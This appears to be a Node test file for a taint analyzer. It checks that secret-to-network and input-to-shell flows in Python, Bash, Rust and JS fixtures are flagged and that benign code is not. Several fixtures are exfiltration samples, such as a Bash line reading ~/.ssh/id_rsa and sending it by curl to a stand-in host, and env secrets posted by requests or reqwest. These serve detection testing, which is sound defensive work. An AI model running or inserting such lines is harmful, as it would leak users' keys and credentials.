// Runs under NODE (via `tsx --test`), not bun (tree-sitter native bindings).
import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { analyzeTaint } from "./index.ts";

const flows = (path: string, content: string) =>
	analyzeTaint([{ path, content }]).flows.length;

describe("polyglot taint (Python/Bash/Rust) + JS/TS dispatch", () => {
	test("Python: env secret -> network sink is flagged (exfiltration)", () => {
		assert.ok(
			flows(
				"a.py",
				'import os,requests\ns=os.getenv("SECRET")\nrequests.post("http://x",data=s)\n',
			) > 0,
		);
	});
	test("Python: source directly inside a sink argument is flagged", () => {
		assert.ok(
			flows(
				"b.py",
				'import os,requests\nrequests.post("http://x",data=os.environ.get("T"))\n',
			) > 0,
		);
	});
	test("Python: user input -> subprocess is flagged (injection)", () => {
		assert.ok(
			flows(
				"c.py",
				"import subprocess\nx=input()\nsubprocess.run(x,shell=True)\n",
			) > 0,
		);
	});
	test("Python: multi-hop taint propagates across assignments", () => {
		assert.ok(
			flows(
				"e.py",
				'import os,requests\na=os.getenv("K")\nb=a\nrequests.post("http://x",data=b)\n',
			) > 0,
		);
	});
	test("Python: benign code produces no false positive", () => {
		assert.equal(flows("d.py", "import math\nprint(math.sqrt(9))\n"), 0);
	});
	test("Bash: cat secret -> curl is flagged", () => {
		assert.ok(
			flows(
				"f.sh",
				'SECRET=$(cat /home/u/.ssh/id_rsa)\ncurl -d "$SECRET" http://x\n',
			) > 0,
		);
	});
	test("Bash: benign code produces no false positive", () => {
		assert.equal(flows("g.sh", "echo hi\nls -la\n"), 0);
	});
	test("Rust: env::var -> reqwest is flagged", () => {
		assert.ok(
			flows(
				"h.rs",
				'fn main(){ let s = std::env::var("S").unwrap(); reqwest::get(&s); }\n',
			) > 0,
		);
	});
	test("JS/TS dispatch still works via the TypeScript analyzer", () => {
		assert.ok(
			flows(
				"i.js",
				'const t=process.env.TOKEN;\nfetch("http://x",{method:"POST",body:t});\n',
			) > 0,
		);
	});

	// ── evasion regressions (previously false negatives) ──
	test("Python: sink via any receiver (s = Session(); s.post) is flagged", () => {
		assert.ok(
			flows(
				"r1.py",
				'import os,requests\ns=requests.Session()\nk=os.getenv("K")\ns.post("http://x",data=k)\n',
			) > 0,
		);
	});
	test("Python: import alias (import requests as r; r.post) is flagged", () => {
		assert.ok(
			flows(
				"r2.py",
				'import os\nimport requests as r\nk=os.getenv("K")\nr.post("http://x",data=k)\n',
			) > 0,
		);
	});
	test("Python: dict.get is NOT a network sink (no false positive)", () => {
		assert.equal(flows("r3.py", 'd={}\nx=d.get("k")\nprint(x)\n'), 0);
	});
	test("Rust: chained builder .body(secret).send() is flagged", () => {
		assert.ok(
			flows(
				"r4.rs",
				'use std::env;\nfn main(){ let s=env::var("K").unwrap(); reqwest::blocking::Client::new().post("http://x").body(s).send().unwrap(); }\n',
			) > 0,
		);
	});
	test("Bash: direct secret-named env expansion into curl is flagged", () => {
		assert.ok(flows("r5.sh", 'curl -X POST -d "$AWS_SECRET_ACCESS_KEY" http://x\n') > 0);
	});
	test("Bash: benign env var ($USER_NAME) is NOT flagged (no false positive)", () => {
		assert.equal(flows("r6.sh", 'curl -X POST -d "$USER_NAME" http://api.example.com\n'), 0);
	});

	// ── interprocedural (function-summary) regressions ──
	test("Python: return-taint helper (post(get_secret())) is flagged", () => {
		assert.ok(
			flows(
				"ip1.py",
				'import os,requests\ndef gs():\n    return os.getenv("K")\nrequests.post("http://x", data=gs())\n',
			) > 0,
		);
	});
	test("Python: param-to-sink (send(secret)) is flagged", () => {
		assert.ok(
			flows(
				"ip2.py",
				'import os,requests\ndef send(x):\n    requests.post("http://x", data=x)\nsend(os.getenv("SECRET"))\n',
			) > 0,
		);
	});
	test("Python: param-to-sink 2-hop is flagged", () => {
		assert.ok(
			flows(
				"ip3.py",
				'import os,requests\ndef inner(x):\n    requests.post("http://x", data=x)\ndef outer(y):\n    inner(y)\nouter(os.getenv("SECRET"))\n',
			) > 0,
		);
	});
	test("Python: helper returning a literal is NOT flagged", () => {
		assert.equal(
			flows("ip4.py", 'import requests\ndef gs():\n    return "hi"\nrequests.post("http://x", data=gs())\n'),
			0,
		);
	});
	test("Python: passing a secret to a non-sink function (print) is NOT flagged", () => {
		assert.equal(
			flows("ip5.py", 'import os\ndef send(x):\n    print(x)\nsend(os.getenv("SECRET"))\n'),
			0,
		);
	});
	test("Rust: return-taint helper via implicit return is flagged", () => {
		assert.ok(
			flows(
				"ip6.rs",
				'use std::env;\nfn gs() -> String { env::var("K").unwrap() }\nfn main(){ reqwest::blocking::Client::new().post("http://x").body(gs()).send().unwrap(); }\n',
			) > 0,
		);
	});
	test("Rust: param-to-sink is flagged", () => {
		assert.ok(
			flows(
				"ip7.rs",
				'use std::env;\nfn send(x: String){ reqwest::get(&x); }\nfn main(){ let s = env::var("K").unwrap(); send(s); }\n',
			) > 0,
		);
	});
});
